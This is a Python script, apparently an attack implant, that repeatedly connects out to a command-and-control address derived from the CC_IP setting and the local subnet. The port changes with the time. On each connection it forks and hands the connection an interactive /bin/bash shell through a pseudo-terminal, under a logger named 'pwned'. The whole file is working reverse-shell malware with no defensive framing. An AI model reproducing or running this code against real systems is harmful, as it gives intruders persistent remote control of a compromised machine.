import socket
import subprocess
import socket
import fcntl
import struct
import operator
import logging
import time
import random
import os
import pty
import sys

CC_IP = os.environ.get('CC_IP','255.255.255.252')
CC_INTERFACE = os.environ.get('CC_INTERFACE', 'eth0')
LOG_LEVEL = os.environ.get('LOG_LEVEL', 'INFO')

_levelnum = getattr(logging, LOG_LEVEL.upper(), None)
if not isinstance(_levelnum, int):
    raise ValueError('Invalid log level: {}'.format(LOG_LEVEL))

logging.basicConfig(level=_levelnum, format="[%(process)d: %(levelname)s %(asctime)s] %(message)s", datefmt="%m-%d %H:%M:%S")
logger = logging.getLogger('pwned')

interval = 10

class Ip:
    _socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # both in packed bytes form
    def __init__(self, ip):
        self.ip = ip

    def _bitop(self, other, op):
        selfint, otherint = (struct.unpack('!I', socket.inet_aton(o.ip))[0] for o in (self, other))
        resint = op(selfint, otherint)
        return self.__class__(socket.inet_ntoa(struct.pack('!I', resint)))

    def __and__(self, other):
        return self._bitop(other, operator.__and__)

    def __or__(self, other):
        return self._bitop(other, operator.__or__)

    def __xor__(self, other):
        return self._bitop(other, operator.__xor__)

    def __invert__(self):
        return self._bitop(self.__class__('255.255.255.255'), operator.__xor__)

    def __str__(self):
        return self.ip

    def __repr__(self):
        return '<{0}.{1} {2!s}>'.format(__name__, self.__class__.__name__, self)

    @classmethod
    def _ifctl(cls, ifname, code):
        if isinstance(ifname, str):
            ifname = ifname.encode('utf-8')

        ip = socket.inet_ntoa(fcntl.ioctl(
            cls._socket.fileno(),
            code,
            struct.pack('256s', ifname[:15])
        )[20:24])

        return cls(ip)

    @classmethod
    def ifaddr(cls, ifname):
        return cls._ifctl(ifname, 0x8915) # SIOCGIFADDR

    @classmethod
    def ifmask(cls, ifname):
        return cls._ifctl(ifname, 0x891b)  # SIOCGIFNETMASK

if __name__ == '__main__':
    ccip = (Ip(CC_IP) & ~Ip.ifmask(CC_INTERFACE)) | (Ip.ifaddr(CC_INTERFACE) & Ip.ifmask(CC_INTERFACE))

    while True:
        port = int(time.time()) % 0xFFF0 + 0x0F
        logger.info('Reaching out to %s:%d', ccip, port)

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ccip.ip, port))

                pid = os.fork()
                if pid == 0:
                    # We are in the child process
                    try:
                        os.dup2(s.fileno(), sys.stdout.fileno())
                        os.dup2(s.fileno(), sys.stdin.fileno())
                        ret = pty.spawn("/bin/bash")
                        logger.info("Reverse shell exited with code: %d", ret)
                    except Exception:
                        logger.exception("Reverse shell process threw!")
                    finally:
                        sys.exit(0)

        except OSError as err:
            logging.info("Exception: %s", err)

        logging.info("Sleeping for %0.2f seconds", interval)
        time.sleep(interval)
